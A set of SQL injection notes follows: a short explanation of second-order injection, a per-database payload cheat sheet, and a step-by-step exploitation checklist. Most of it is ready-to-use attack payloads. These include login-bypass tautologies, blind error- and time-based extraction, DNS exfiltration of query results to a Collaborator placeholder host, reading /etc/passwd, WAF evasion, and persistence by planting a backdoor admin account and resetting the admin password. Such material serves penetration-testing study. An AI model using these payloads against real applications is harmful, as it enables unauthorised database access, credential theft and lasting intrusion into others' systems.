Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.

Second-order SQL injection often occurs in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.

# SQL injection cheat sheet

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

## String concatenation

You can concatenate together multiple strings to make a single string.

|   |   |
|---|---|
|Oracle|`'foo'\|'bar'`|
|Microsoft|`'foo'+'bar'`|
|PostgreSQL|`'foo'\|'bar'`|
|MySQL|`'foo' 'bar'` [Note the space between the two strings]  <br>`CONCAT('foo','bar')`|

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

|   |   |
|---|---|
|Oracle|`SUBSTR('foobar', 4, 2)`|
|Microsoft|`SUBSTRING('foobar', 4, 2)`|
|PostgreSQL|`SUBSTRING('foobar', 4, 2)`|
|MySQL|`SUBSTRING('foobar', 4, 2)`|

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input.

|   |   |
|---|---|
|Oracle|`--comment   `|
|Microsoft|`--comment   /*comment*/`|
|PostgreSQL|`--comment   /*comment*/`|
|MySQL|`#comment`  <br>`-- comment` [Note the space after the double dash]  <br>`/*comment*/`|

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

|   |   |
|---|---|
|Oracle|`SELECT banner FROM v$version   SELECT version FROM v$instance   `|
|Microsoft|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|

## Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

|   |   |
|---|---|
|Oracle|`SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`|
|Microsoft|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|
|PostgreSQL|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|
|MySQL|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|

## Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.

|   |   |
|---|---|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`|
|Microsoft|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`|
|PostgreSQL|`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`|

## Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

|   |   |
|---|---|
|Microsoft|`SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.`|
|PostgreSQL|`SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`|
|MySQL|`SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`|

## Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

|   |   |
|---|---|
|Oracle|`Does not support batched queries.`|
|Microsoft|`QUERY-1-HERE; QUERY-2-HERE   QUERY-1-HERE QUERY-2-HERE`|
|PostgreSQL|`QUERY-1-HERE; QUERY-2-HERE`|
|MySQL|`QUERY-1-HERE; QUERY-2-HERE`|

#### Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

|   |   |
|---|---|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

|   |   |
|---|---|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`|
|Microsoft|`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`|

## DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

|   |   |
|---|---|
|Oracle|(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br><br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<br><br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`|
|Microsoft|`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`|
|PostgreSQL|`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`|
|MySQL|The following techniques work on Windows only:<br><br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`  <br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|

## DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

|   |   |
|---|---|
|Oracle|`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|(SELECT YOUR-QUERY-HERE)\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`|
|Microsoft|`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`|
|PostgreSQL|`create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '\|p\|'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();`|
|MySQL|The following technique works on Windows only:  <br>`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|



#### Total Summary
To help you dive deeper into SQL injection (SQLi) exploitation, here’s a structured checklist covering the stages of an SQLi attack, organized by potential payloads, techniques, and use cases. This includes what to check for at each step, from initial testing to full database extraction. The goal is to provide a comprehensive checklist to guide you through exploiting an SQLi vulnerability in various scenarios.

---

### **1. Initial SQL Injection Testing:**
   - **Payloads to Identify SQL Injection Vulnerability:**
      - `' OR '1'='1` - Basic tautology to check if input is unsanitized.
      - `admin' --` or `' OR 1=1 --` - Common bypass for login forms.
      - `' OR 'a'='a` - Alternative tautology, useful if numbers don’t work.
   - **Purpose**: To determine if the input field is vulnerable to SQLi by injecting common Boolean conditions that yield true.

   - **Checklist**:
     - [ ] Try simple tautology payloads in various fields (login, search, etc.).
     - [ ] Check for error messages indicating SQL errors (e.g., syntax errors, database errors).
     - [ ] Use different types of quotation marks (`'`, `"`, `` ` ``) to bypass sanitization methods.

### **2. Identifying the Database Type:**
   - **Payloads for Database Fingerprinting:**
      - `SELECT @@version` - Works on MySQL to reveal version information.
      - `SELECT version()` - Often effective on PostgreSQL.
      - `SELECT banner FROM v$version` - To identify Oracle databases.
   - **Purpose**: Database identification helps refine payloads for specific database types.

   - **Checklist**:
     - [ ] Test version-specific commands to identify the database.
     - [ ] Look for error messages that may reveal database type.
     - [ ] Use UNION SELECT-based payloads to infer database behavior.

### **3. Determining the Number of Columns:**
   - **Payloads for Column Enumeration**:
      - `ORDER BY 1` … `ORDER BY n` - Increment to find the valid column count.
      - `UNION SELECT NULL, NULL …` - Adjust number of `NULL` values to match column count.
   - **Purpose**: Helps in crafting UNION-based injection payloads, as knowing the number of columns is essential for successful execution.

   - **Checklist**:
     - [ ] Incrementally test `ORDER BY` to identify the maximum column index.
     - [ ] Use `UNION SELECT NULL` payloads until the number of columns matches.
     - [ ] Confirm the correct column count by observing changes in response.

### **4. Finding Vulnerable Columns for Data Extraction:**
   - **Payloads for Detecting Output Columns**:
      - `UNION SELECT 1,2,3,…` - Insert integers until visible output columns are identified.
      - `UNION SELECT NULL, username, NULL` - Using field names when the column structure is known.
   - **Purpose**: This identifies which columns in the result set can display injected data, enabling data extraction in later steps.

   - **Checklist**:
     - [ ] Use identifiable values (e.g., numbers) in each column to find visible columns.
     - [ ] Test with known field names to see if sensitive information can be extracted.

### **5. Extracting Sensitive Information:**
   - **Payloads for Data Extraction**:
      - `UNION SELECT username, password FROM users` - Basic table extraction payload.
      - `SELECT table_name FROM information_schema.tables` - Enumerate tables.
      - `SELECT column_name FROM information_schema.columns WHERE table_name='users'` - Enumerate columns for a specific table.
   - **Purpose**: These payloads help access sensitive information by leveraging information schema tables (available in most databases).

   - **Checklist**:
     - [ ] Use `information_schema.tables` to list available tables.
     - [ ] Use `information_schema.columns` to list columns within tables.
     - [ ] Extract sensitive data (e.g., usernames, passwords) from targeted tables.

### **6. Advanced Techniques: Blind SQL Injection:**
   - **Payloads for Time-Based Blind SQLi**:
      - `IF(1=1, SLEEP(5), 0)` - MySQL time delay to infer true/false.
      - `AND pg_sleep(5)` - PostgreSQL time delay equivalent.
   - **Boolean-Based Blind SQLi Payloads**:
      - `' AND 1=1 --` - Testing true condition.
      - `' AND 1=2 --` - Testing false condition.
   - **Purpose**: Blind SQLi techniques allow exploitation without visible error messages or direct output, by inferring responses based on delays or true/false responses.

   - **Checklist**:
     - [ ] Test time-based payloads and observe delay differences.
     - [ ] Use Boolean-based conditions to infer data bit-by-bit.
     - [ ] Enumerate data by asking true/false questions to retrieve sensitive information.

### **7. Bypassing Filters and WAFs (Web Application Firewalls):**
   - **Payloads for WAF Evasion**:
      - `%27` - URL encoding for `'`.
      - `/*! SELECT */` - MySQL inline comment to obfuscate keywords.
      - `UNION ALL SELECT` - Adding `ALL` to bypass keyword-based filtering.
   - **Purpose**: These payloads evade security filters by encoding characters, using comments, or altering syntax, allowing bypass of input sanitization.

   - **Checklist**:
     - [ ] Try URL encoding or double encoding to bypass filtering.
     - [ ] Use inline comments or alternative keywords for obfuscation.
     - [ ] Test with a variety of encoding and payload variations to detect weaknesses in filtering rules.

### **8. Gaining Deeper Access (Privilege Escalation):**
   - **Payloads for Privilege Escalation**:
      - `GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost'` - Attempt to escalate privileges (if permissions allow).
      - `SELECT load_file('/etc/passwd')` - Access sensitive files (MySQL specific).
   - **Purpose**: Some SQLi vulnerabilities allow for privilege escalation or file access, useful in lateral movement within the database or the server.

   - **Checklist**:
     - [ ] Test for administrative access capabilities if the application is misconfigured.
     - [ ] Attempt to read system files if file reading functions are available.
     - [ ] Test for privilege alteration or user creation capabilities.

### **9. Maintaining Access (Persistence):**
   - **Payloads for Backdoor Access**:
      - `INSERT INTO users (username, password) VALUES ('backdoor', 'password')` - Create a new admin user.
      - `UPDATE users SET password='new_password' WHERE username='admin'` - Change admin credentials.
   - **Purpose**: In vulnerable applications, creating new users or modifying credentials can allow sustained access even if SQLi is patched later.

   - **Checklist**:
     - [ ] Try creating new high-privilege users.
     - [ ] Attempt password reset for known accounts (e.g., `admin`).
     - [ ] Use persistent payloads to ensure ongoing access to the application.

---

### Final Notes:
This checklist gives you a structured approach to SQLi exploitation, covering each step in detail. With each stage, remember to adapt payloads based on observed responses, adjust to the database type, and be cautious of triggering security mechanisms. This methodical approach will help you comprehensively assess and exploit SQLi vulnerabilities in various scenarios.